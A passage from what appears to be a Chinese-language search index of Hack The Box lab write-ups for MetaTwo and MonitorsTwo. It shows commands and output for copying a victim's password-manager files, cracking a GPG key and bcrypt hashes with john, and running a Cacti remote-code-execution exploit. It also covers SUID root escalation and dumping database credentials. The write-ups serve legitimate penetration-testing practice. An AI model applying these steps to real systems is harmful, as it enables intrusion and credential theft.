J+Lbl8hC/sG\n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\n=7Uo6\n-----END PGP PRIVATE KEY BLOCK-----\n</code></pre></p> <p>\u4e0d\u77e5\u9053\u80fd\u4e0d\u80fd\u7834\u89e3\uff0c\u641c\u4e86\u4e0b <code>john passpie</code> \u770b\u770b\uff0c\u50cf\u662f\u7528john\u80fd\u7834\u89e3\u3002  </p> <p>https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html</p> <p>\u5148\u628a\u6587\u4ef6\u4e0b\u5230\u672c\u5730\u3002 \u7136\u540e\u5c1d\u8bd5john\u3002\u4e0d\u8fc7\u62a5\u9519\u8bf4\u6587\u4ef6\u53ea\u9700\u8981\u79c1\u94a5\uff0c\u90a3\u5c31\u6574\u7406\u4e00\u4e0b\u518d\u7ee7\u7eed\uff1a <pre><code>$ scp -r jnelson@10.10.11.186:/home/jnelson/.passpie .\n\n\n$ sudo sh -c 'gpg2john .keys &gt; gpghash'\n[sudo] kali \u7684\u5bc6\u7801\uff1a\nCreated directory: /root/.john\n\nFile .keys\nError: Ensure that the input file .keys contains a single private key only.\nError: No hash was generated for .keys, ensure that the input file contains a single private key only.\n\n\n$ sudo sh -c 'tail -n 45 .keys &gt; privKey.pgp'\n\n$ sudo sh -c ' gpg2john privKey.pgp &gt; pgp.hash'\n\n$ john pgp.hash\n...\nProceeding with wordlist:/usr/share/john/password.lst\nblink182         (Passpie) \n</code></pre></p> <p>OK\uff01 \u518d\u5230\u76ee\u6807\u673a\u8bd5\u8bd5 <code>export</code>\uff1a <pre><code>jnelson@meta2:~$ passpie export pass\nPassphrase: \njnelson@meta2:~$ cat pass \ncredentials:\n- comment: ''\n  fullname: root@ssh\n  login: root\n  modified: 2022-06-26 08:58:15.621572\n  name: ssh\n  password: !!python/unicode 'p7qfAZt4_A1xo_0x'\n- comment: ''\n  fullname: jnelson@ssh\n  login: jnelson\n  modified: 2022-06-26 08:58:15.514422\n  name: ssh\n  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'\nhandler: passpie\nversion: 1.0\n</code></pre></p> <p>\u62ff\u5230root\u7684SSH\u5bc6\u7801~</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#flag-root","title":"flag: root","text":"<pre><code>jnelson@meta2:~$ su -\nPassword: \nroot@meta2:~# cat \n.bash_history  .bashrc        .local/        .profile       restore/       root.txt       \nroot@meta2:~# cat root.txt\n6b757\u2026\u2026\u2026\u20261658172\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MetaTwo/#_4","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2022/12/22 \u56e0\u4e3a\u51c6\u5907\u8003CEH\uff0c\u4e0a\u5b8c\u8bfe\u89c9\u5f97\u4ee5\u524d\u7684\u5b66\u4e60\u592a\u8fc7\u7406\u8bba\u4e86\uff0c\u4e8e\u662f\u60f3\u7740\u4ee5\u5b9e\u8df5\u590d\u4e60\u4e00\u4e0b\uff0c\u987a\u4fbf\u51b2\u4e00\u4e0bRank\u3002 \u81f3\u6b64\uff0c\u7ec8\u4e8e\u6253\u5b8c\u4e865\u53f0Esay\uff08Photobomb\u7684WP\u6ca1\u5199\uff09\uff0c\u518d\u6253\u4e00\u53f0Medium\u5c31\u8981\u8131\u79bbScript Kiddie\uff0c\u8d70\u5411Hacker\u5566~</p> <p>\u8fd9\u53f0\u4e5f\u662f\u8fd9\u6bb5\u65f6\u95f4\u6d3b\u8dc3\u76845\u53f0Easy\u91cc\u7528\u6237\u8bc4\u4ef7\u6700\u96be\u7684\u4e00\u53f0\u3002 \u4e0d\u8fc7\u6709\u4e86\u524d\u51e0\u53f0\u7684\u7ecf\u9a8c\uff0c\u4f3c\u4e4e\u7a0d\u5fae\u9886\u609f\u5230\u4e00\u70b9\u5957\u8def\uff0c\u4e8e\u662fWP\u7684\u683c\u5f0f\u4e5f\u9010\u6e10\u6539\u5584\uff0c\u6700\u540e\u5b9a\u4e0b\u4e00\u4e2a\u5927\u4f53\u4e0a\u7684WP\u6a21\u677f\u3002 \u4e00\u662f\u65b9\u4fbf\u4eca\u540e\u5199WP\uff0c\u53e6\u4e00\u4e2a\u662f\u63d0\u9192\u81ea\u5df1\u628a\u63e1\u6e17\u900f\u6d41\u7a0b\uff0c\u65f6\u523b\u90fd\u8981\u660e\u767d\u81ea\u5df1\u5904\u4e8e\u54ea\u4e2a\u9636\u6bb5\u3001\u76ee\u7684\u662f\u4ec0\u4e48\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/","title":"HTB-MonitorsTwo","text":"<p>\u8003\u5b8cCEH\uff0c\u4e45\u8fdd\u5730\u56de\u6765\u6253\u4e00\u6253\u9776\u3002\u90fd\u6709\u70b9\u5fd8\u4e86\u600e\u4e48\u64cd\u4f5c\u4e86\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#_1","title":"\u626b\u63cf","text":"<pre><code>sudo nmap -n -Pn -sS -p 1-10000 --min-rate=5000 10.10.11.211\nsudo nmap -v -n -Pn -sV -O -p 22,80 --script=vuln 10.10.11.211 -oA 10.10.11.211\n</code></pre> <p>\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u8fd9\u6b21NSE\u811a\u672c\u626b\u63cf\u975e\u5e38\u975e\u5e38\u6162\uff0c\u7136\u540e\u5176\u5b9e\u4e5f\u6ca1\u592a\u591a\u6709\u7528\u7684\u4fe1\u606f\u3002</p> <ul> <li>22</li> <li>80</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#80","title":"80\u7aef\u53e3","text":"<p>\u8bbf\u95ee\u76ee\u6807\u7f51\u7ad9\uff0c\u662f\u4e2a\u767b\u9646\u754c\u9762\u3002\u7b80\u5355\u8bd5\u4e86\u4e0b\u5355\u5f15\u53f7\u767b\u9646\uff0c\u7b80\u5355\u5730\u62a5\u9519\u4e86\u3002\u7559\u610f\u5230\u9875\u9762\u4e0b\u65b9\u5199\u4e86\u884c Version 1.2.22 | (c) 2004-2023 - The Cacti Group\u3002</p> <p>\u4e8e\u662f\u5148\u5c1d\u8bd5\u672c\u5730\u641c\u4e00\u6ce2\uff0c<code>searchsploit cacti</code> \u53d1\u73b0\u8fd9\u4e2a\uff1a</p> <p>Cacti v1.2.22 - Remote Command Execution (RCE) \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 | php/webapps/51166.py</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#initial-access","title":"Initial Access","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#poc-cve-2022-46169","title":"PoC (CVE-2022-46169)","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#1exploitdb","title":"\u65b9\u6cd51\uff1aExploitDB \u811a\u672c","text":"<p>\u5f00\u641e\uff0c\u590d\u5236\u811a\u672c\u5230\u5f53\u524d\u76ee\u5f55\uff1a<code>searchsploit -m 51166</code></p> <p>\u4e0d\u8fc7\u811a\u672c\u8fd0\u884c\u8d77\u6765\u4e00\u76f4\u62ff\u4e0d\u5230shell\u2026\u2026</p> <p>\u8c37\u6b4c\u4e00\u4e0b\u5012\u662f\u4e5f\u6709\u5176\u4ed6exp\uff0c\u4f46\u662f\u5c31\u662f\u60f3\u5f04\u660e\u767d\u4e3a\u4ec0\u4e48ExploitDB\u8fd9\u4e2aexp\u4e0d\u884c\u3002</p> <p>\u7136\u540e\u8fd9\u7bc7\u6587\u7ae0\u7ed9\u4e86\u6211\u63d0\u793a\uff0c\u770b\u6765\u8981\u7406\u89e3\u6f0f\u6d1e\u539f\u7406\u554a\u2026\u2026\u66f4\u6539\u4e86\u4e00\u4e0bexp\u811a\u672c\u4e2d\u7684 <code>'X-Forwarded-For': f'{local_cacti_ip}'</code>\uff0c\u5c06\u5176\u76f4\u63a5\u6307\u5b9a\u4e3a <code>'X-Forwarded-For': f'127.0.0.1'</code>\u3002</p> <p>\u8fd0\u884c\u540e\u6210\u529fgetshell\uff1a <pre><code>bash-5.1$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre></p> <p>\u60f3\u5347\u4e3a\u4ea4\u4e92shell\u6765\u7740\u4e0d\u8fc7\u6ca1\u88c5python\uff0c\u6682\u65f6\u5148\u5c06\u5c31\u7740\u4e86\u3002 <pre><code>bash-5.1$ which python python2 python3\nwhich python python2 python3\nbash-5.1$ \n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#2metasploit","title":"\u65b9\u6cd52\uff1ametasploit","text":"<p>\u8c37\u6b4c\u7684\u65f6\u5019\u53d1\u73b0metasploit\u4e5f\u6709exp</p> <p>https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/</p> <p>\u4e0d\u8fc7\u6700\u5f00\u59cb\u8bd5\u4e86\u8bd5\u4e5f\u4e0d\u884c\uff0c\u4e3b\u8981\u662f\u4e24\u79cd\u62a5\u9519\uff1a</p> <ol> <li>\u5f00\u542fnc\u76d1\u542c\u7684\u8bdd\u5c31\u4f1a\u62a5\u9519\u672c\u5730\u7aef\u53e3\u88ab\u5360\u7528\uff08\u592a\u4e45\u4e0d\u7528msf\u4eba\u90fd\u50bb\u4e86\uff0c\u4f3c\u4e4e\u672c\u8eab\u5c31\u4e0d\u7528\u53e6\u5916\u5f00\u542f\u76d1\u542c\u2026\u2026\uff09</li> <li>\u663e\u793a\u5229\u7528\u6210\u529f\u4f46\u662f\u6ca1\u5efa\u7acb\u8fde\u63a5\uff08\u62a5\u9519\u4fe1\u606f\u5982\u4e0b\uff09<pre><code>[*] Command Stager progress - 100.00% done (1118/1118 bytes)\n[*] Exploit completed, but no session was created.\n</code></pre> </li> </ol> <p>\u540e\u6765\u5076\u7136\u591a\u8bd5\u51e0\u6b21\u5c31\u53ef\u4ee5\u4e86\u2026\u2026\u6709\u70b9\u8ff7\u3002\u770b\u6765\u4ee5\u540e\u51fa\u73b0\u4e0a\u8ff0\u62a5\u9519\u4fe1\u606f\u7684\u8bdd\u5c31\u8bf4\u660e\u5229\u7528\u662f\u6210\u529f\u7684\u53ea\u662f\u5f97\u591a\u8bd5\u51e0\u6b21\uff1f</p> <pre><code>meterpreter &gt; getuid\nServer username: www-data\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#docker","title":"docker\u5bb9\u5668","text":"<p>\u7a0d\u5fae\u63a2\u7d22\u4e86\u4e00\u4e0b\u4ec0\u4e48\u90fd\u6ca1\u53d1\u73b0\uff0c\u5bb6\u76ee\u5f55\u6ca1\u4e1c\u897f\uff0c\u5f88\u591a\u547d\u4ee4\u5982<code>sudo</code>\u3001<code>ifconfig</code>\u90fd\u6ca1\u6709\uff0c\u76f4\u63a5<code>find</code>\u547d\u4ee4\u641cuser.txt\u4e5f\u627e\u4e0d\u5230flag\u3002\u611f\u89c9\u6709\u70b9\u4e0d\u540c\u4e8e\u4e00\u822ceasy\u673a\u5668\u7684\u5957\u8def\u3002</p> <p>\u72e1\u733e\u5730\u7528Meterpreter\u8fde\u4e0a\u53bb\u6536\u96c6\u4e00\u4e0b\u4fe1\u606f\uff0c\u53d1\u73b0\u6709172.19\u7684IP\u2014\u2014\u8fd9\u662fdocker\u7684\u9ed8\u8ba4\u7f51\u6bb5\u4e4b\u4e00\u3002\u4e8e\u662f\u76f4\u63a5\u8dd1\u53bb\u6839\u76ee\u5f55\u770b\u770b\u662f\u5426\u6709 <code>.dockerenv</code> \u6587\u4ef6\uff0c\u7ed3\u679c\u679c\u7136\u662f\u5728docker\u5bb9\u5668\u91cc\u554a\u3002</p> <p>\u540e\u6765\u770b\u4e86\u4e0bLinPEAS\u662f\u5982\u4f55\u6536\u96c6\u7f51\u7edc\u4fe1\u606f\u7684\uff1a\u67e5\u770b <code>/etc/hosts</code> \u6587\u4ef6\u3002</p> <pre><code>meterpreter &gt; sysinfo\nComputer     : 172.19.0.3\nOS           : Debian 11.5 (Linux 5.4.0-147-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\n\nmeterpreter &gt; ifconfig\nInterface  1\n============\nName         : lo\nHardware MAC : 00:00:00:00:00:00\nMTU          : 65536\nFlags        : UP,LOOPBACK\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\n\nInterface  8\n============\nName         : eth0\nHardware MAC : 02:42:ac:13:00:03\nMTU          : 1500\nFlags        : UP,BROADCAST,MULTICAST\nIPv4 Address : 172.19.0.3\nIPv4 Netmask : 255.255.0.0\n\n\nmeterpreter &gt; ls\nListing: /\n==========\n\nMode              Size   Type  Last modified              Name\n----              ----   ----  -------------              ----\n100755/rwxr-xr-x  0      fil   2023-03-21 06:49:05 -0400  .dockerenv\n\u2026\u2026\n</code></pre> <p>\u4ee5\u53ca\u6839\u76ee\u5f55\u8fd8\u6709\u4e2a <code>entrypoint.sh</code> \u4e0d\u77e5\u9053\u662f\u5e72\u5565\u7684\u3002</p> <p>\u4ee5\u524d\u597d\u50cf\u6253\u8fc7\u5173\u4e8e\u4e0edocker\u7684\uff0c\u4f46\u662f\u5b8c\u5168\u4e0d\u8bb0\u5f97\u8fc7\u7a0b\u4e86\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#suid","title":"SUID\u63d0\u6743\uff08\u4e0d\u9700\u8981\uff09","text":"<p>\u7ee7\u7eed\u57fa\u7840\u4fe1\u606f\u6536\u96c6\u770b\u770b\uff0cSUID\uff1a <pre><code>bash-5.1$ find / -perm -4000 -exec ls -l \"{}\" \\; 2&gt;/dev/null\nfind / -perm -4000 -exec ls -l \"{}\" \\; 2&gt;/dev/null\n-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd\n-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh\n-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn\n-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp\n-rwsr-sr-x 1 www-data www-data 16664 May 14 22:03 /tmp/suid\n-rwsr-xr-x 1 root root 30872 Oct 14  2020 /sbin/capsh\n-rwsr-xr-x 1 root root 55528 Jan 20  2022 /bin/mount\n-rwsr-xr-x 1 root root 35040 Jan 20  2022 /bin/umount\n-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash\n-rwsr-xr-x 1 root root 71912 Jan 20  2022 /bin/su\n</code></pre></p> <p>\u6709\u4e9b\u4e0d\u548b\u89c1\u5230\u7684\uff0c\u6bd4\u5982 <code>capsh</code>\uff0c\u5728GTFBins\u641c\u641c\u770b\uff0c\u53d1\u73b0\u80fd\u5229\u7528\uff1a <pre><code>bash-5.1$ /sbin/capsh --gid=0 --uid=0 --\n/sbin/capsh --gid=0 --uid=0 --\nid\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\n</code></pre></p> <p>\u62ff\u5230docker\u7684root\u6743\u9650\u3002</p> <p>\u7136\u540e\u53d1\u73b0\u81ea\u5df1\u62ff\u5230root\u6743\u9650\u4e5f\u4e0d\u77e5\u9053\u8981\u5e72\u5565\u2026\u2026\u4e8b\u524d\u4e5f\u6ca1\u592a\u591a\u601d\u8def\uff0c\u4e00\u5fc3\u60f3\u7740\u63d0\u6743\u90fd\u662f\u8d70\u4e00\u6b65\u770b\u4e00\u6b65\uff0c\u611f\u89c9\u8fd9\u4e2a\u4e60\u60ef\u4e0d\u597d\u554a\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#db","title":"\u63a2\u7d22DB","text":"<p>\u60f3\u8d77\u6765\u6839\u76ee\u5f55\u8fd8\u6709\u4e2a <code>entrypoint.sh</code> \u6587\u4ef6\u89c9\u5f97\u5f88\u53ef\u7591\uff0c\u4e4b\u524d\u7531\u4e8e\u6ca1\u6709root\u6743\u9650\u4e5f\u6ca1\u600e\u4e48\u770b\u3002\u73b0\u5728\u770b\u770b\u811a\u672c\u4f3c\u4e4e\u662f\u5728\u90e8\u7f72DB\uff1f\u5173\u6ce8\u5230\u91cc\u9762\u6709\u4e00\u884c  <code>mysql --host=db --user=root --password=root cacti -e \"show tables\"</code>\u3002\u8fd0\u884c\u4e86\u4e00\u4e0b\u811a\u672c\u4e5f\u786e\u5b9e\u663e\u793a\u4e86tables\u3002\u6240\u4ee5\u60f3\u7740\u5e94\u8be5\u53ef\u4ee5\u4fee\u6539\u8fd9\u4e2a\u547d\u4ee4\u63a2\u7d22 <code>cacti</code> \u8fd9\u4e2aDB\u3002</p> <p>\u540e\u6765\u53d1\u73b0\u8fd9\u6761\u547d\u4ee4\u751a\u81f3\u8fd9\u4e2a\u811a\u672c\u5176\u5b9e\u4e0d\u7528root\u6743\u9650\u4e5f\u80fd\u6267\u884c\u2026\u2026\u56e0\u4e3abash\u547d\u4ee4\u8bbe\u7f6e\u4e86root\u6743\u9650\u7684SUID\uff0c\u800cmysql\u547d\u4ee4\u91cc\u76f4\u63a5\u7ed9\u4e86\u8d26\u53f7\u5bc6\u7801\u53bb\u8fde\u63a5DB\u2026\u2026</p> <pre><code>bash-5.1$ mysql --host=db --user=root --password=root cacti -e \"select * from user_auth\"\n&lt; --password=root cacti -e \"select * from user_auth\"\nid      username        password        realm   full_name       email_address   must_change_password    password_change    show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees       policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked     failed_attempts lastfail        reset_perms\n1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb              on      on      on      on      on      2       1       1       1       1       on      -1-1       -1              0       0       663348655\n3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3 11       1       1       1               -1      -1      -1              0       0       0\n4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                     on      on      on      on      1       1       1       1       1       on      -1-1               on      0       0       2135691668\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#_3","title":"\u5bc6\u7801\u66b4\u7834","text":"<p>\u4eceDB\u91cc\u62ff\u52303\u4e2a\u5bc6\u7801\uff0c\u611f\u89c9guest\u90a3\u4e2a\u592a\u77ed\u3001\u683c\u5f0f\u4e5f\u548c\u53e6\u5916\u4e24\u4e2a\u5dee\u5f88\u591a\u3002\u6700\u6709\u53ef\u80fd\u662f\u62ff\u5230marcus\u6216\u8005admin\u7684\u5bc6\u7801\u7136\u540eSSH\u8fde\u63a5\u76ee\u6807\u4e3b\u673a\uff1f\u6216\u8005\u8fdbcacti\u7684\u7ba1\u7406\u754c\u9762\u53bb\u63a2\u7d22\u4e3b\u673a\u7684\u8bbf\u95ee\u3002 \u7a0d\u5fae\u6574\u7406\u5982\u4e0b\uff0c\u65b9\u4fbf\u7b49\u4e0b\u7ed9JTR\u66b4\u7834\uff1a <pre><code>\u2514\u2500$ cat user_auth_fromSQL.txt \nadmin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC\nguest:43e9a4ab75570f5b\nmarcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C\n</code></pre></p> <p>\u59d1\u4e14\u8fd93\u4e2a\u90fd\u7528JTR\u8dd1\u4e00\u4e0b\u3002 \u4e00\u5f00\u59cb\u76f4\u63a5\u8fd0\u884c <code>john</code> \u6ca1\u6709\u6307\u5b9aformat\u8dd1\u4e86\u4e00\u9635\u89c9\u5f97\u4e0d\u5bf9\uff0c\u597d\u5947\u67e5\u4e86\u4e00\u4e0b <code>$2y$10$</code>\uff0c\u4f3c\u4e4e\u662fPHP\u7684hash\u7b97\u6cd5\u3002\u7ee7\u7eed\u641c\u641c <code>john the ripper $2y$10$</code>\uff0c\u53d1\u73b0\u8fd9\u7bc7\u6587\u7ae0\uff0c\u770b\u6765\u6309\u7167\u8fd9\u6837\u6307\u5b9a\u597d\u4e9b\uff1a <pre><code>\u2514\u2500$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt user_auth_fromSQL.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nfunkymonkey      (marcus) \n</code></pre></p> <p>\u7ed3\u679c\u5148\u66b4\u7834\u51fa\u6765\u4e86marcus\u7684\u5bc6\u7801\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#flag-user","title":"flag: user","text":"<p>\u6309\u4e4b\u524d\u7684\u601d\u8def\u5148\u8bd5\u8bd5SSH\u8fde\u63a5\uff0c\u6210\u529f\uff1a <pre><code>\u2514\u2500$ ssh marcus@10.10.11.211 \n\n\u2026\u2026\n\nLast login: Sun May 14 22:09:32 2023 from 10.10.14.67\nmarcus@monitorstwo:~$ id\nuid=1000(marcus) gid=1000(marcus) groups=1000(marcus)\nmarcus@monitorstwo:~$ ls\nuser.txt\nmarcus@monitorstwo:~$ cat user.txt \n846a\u2026\u2026\u2026\u2026ada0\n</code></pre></p> <p>\u770b\u6765admin\u5c31\u66b4\u7834\u4e0d\u51fa\u6765\u4e86\uff0c\u505c\u6389john\u66b4\u7834\u5f00\u59cb\u63a2\u7d22\u76ee\u6807\u4e3b\u673a\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#_4","title":"\u63a2\u7d22","text":"<ul> <li>\u65e0sudo</li> <li>SUID\u65e0\u6cd5\u5229\u7528</li> <li>cron</li> <li>\u67e5\u770b\u53ef\u5199\u6587\u4ef6</li> <li>\u67e5\u770bnginx\u914d\u7f6e\u6587\u4ef6</li> <li>LinPEAS\u679a\u4e3e</li> </ul> <p>\u90fd\u8bd5\u4e86\u8bd5\u611f\u89c9\u4e0d\u884c\u2026\u2026\u4e2d\u95f4\u67e5\u5230nginx\u914d\u7f6e\u6587\u4ef6\u53d1\u73b0\u865a\u62df\u4e3b\u673a\u7684\u57df\u540d\u65f6\u8fd8\u5174\u594b\u4e86\u4e00\u4e0b\u4ee5\u4e3a\u8fd9\u4e48\u7b80\u5355\uff0c\u7ed3\u679c\u5199\u5165hosts\u6587\u4ef6\u8bbf\u95ee\u540e\u5c31\u662f\u6700\u5f00\u59cb\u90a3\u4e2aweb\u7f51\u7ad9\u3002</p> <p>\u8ff7\u832b\u2026\u2026\u5728\u5b98\u65b9\u8bba\u575b\u770b\u4e86\u534a\u5929\uff0c\u7ec8\u4e8e\u770b\u5230\u6709\u4e2a\u4eba\u8bf4\u6ce8\u610f\u8fde\u63a5ssh\u65f6\u7684\u6d88\u606f\u2026\u2026\u2026\u2026 \u6211\u65e0\u8bed</p> <p>\u4e8e\u662f\u7ec8\u4e8e\u627e\u5230\u7ebf\u7d22\uff1a <pre><code>marcus@monitorstwo:/var/mail$ cat marcus \nFrom: administrator@monitorstwo.htb\nTo: all@monitorstwo.htb\nSubject: Security Bulletin - Three Vulnerabilities to be Aware Of\n\nDear all,\n\nWe would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.\n\nCVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.\n\nCVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.\n\nCVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.\n\nWe encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.\n\nBest regards,\n\nAdministrator\nCISO\nMonitor Two\nSecurity Team\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#poc-cve-2021-41091","title":"PoC (CVE-2021-41091)","text":"<p>\u627e\u5230PoC\u5c31\u5f88\u7b80\u5355\u4e86\u3002</p> 